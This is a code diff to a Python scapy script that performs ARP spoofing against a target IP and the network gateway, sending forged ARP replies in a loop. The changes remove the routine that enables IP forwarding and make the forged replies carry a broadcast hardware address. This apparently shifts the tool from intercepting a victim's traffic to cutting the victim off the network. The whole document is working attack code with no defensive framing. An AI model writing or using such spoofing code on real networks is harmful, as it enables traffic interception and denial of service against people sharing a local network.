@@ -5,7 +5,7 @@ import subprocess
 
 INTERFACE = scapy.conf.iface.name
 GATEWAY_IP = scapy.conf.route.route("0.0.0.0")[2]
-TARGET_IP = "0.0.0.0" # Target IP address 
+TARGET_IP = "0.0.0.0" # Target IP Address
 
 tracked_devices = {TARGET_IP}
 device_writers = {}
@@ -22,14 +22,6 @@ def Aget_mac(ip):
         pass
     return None
 
-def Lenable_ip_forwarding():
-    print("[*] Enabling IP Forwarding...")
-    try:
-        cmd = "Set-NetIPInterface -Forwarding Enabled"
-        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
-    except Exception:
-        pass
-
 def Mspoof_target(target_ip, gateway_ip):
     target_mac = Aget_mac(target_ip)
     gateway_mac = Aget_mac(gateway_ip)
@@ -37,8 +29,8 @@ def Mspoof_target(target_ip, gateway_ip):
         print("[!] Failed to resolve MACs. Exiting.")
         return
     print(f"[*] Spoofing {target_ip} <--> {gateway_ip}")
-    p1 = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
-    p2 = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
+    p1 = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc="ff:ff:ff:ff:ff:ff")
+    p2 = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc="ff:ff:ff:ff:ff:ff")
 
     while not stop_event.is_set():
         scapy.sendp(p1, verbose=False)
@@ -57,7 +49,6 @@ def Orestore_network():
 
 def Gmain():
     global MY_MAC
-    Lenable_ip_forwarding()
     MY_MAC = scapy.get_if_hwaddr(INTERFACE)
     spoof_thread = threading.Thread(target=Mspoof_target, args=(TARGET_IP, GATEWAY_IP), daemon=True)
     spoof_thread.start()
